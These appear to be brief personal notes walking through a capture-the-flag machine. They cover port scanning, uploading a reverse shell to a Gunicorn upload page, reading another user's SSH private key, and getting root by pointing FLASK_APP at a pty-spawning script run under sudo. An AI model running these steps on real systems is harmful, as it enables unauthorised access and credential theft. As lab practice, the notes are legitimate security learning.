rustscan -a <ip>

	port 22,5001
	
	5001 => homework


tells you to upload file 

		5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage


dir brute gives /submit it only accepts .hs files ie rev shells

upload and you get a rev shell as flask
	
	check /home/prof.ssh and it has hois id_rsa 

log in as prof 

check sudo -l
 and i can run 
		(root) NOPASSWD: /usr/bin/flask run

trying to run it gives error 
	
		Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.  (check why this error occured) lol

 create a file to get rev shell
		
			echo  "import pty; pty.spawn('/bin/sh')" > root.py

			export FLASK_APP=root.py
			
			sudo /usr/bin/flask run
				
			# whoami
			  root
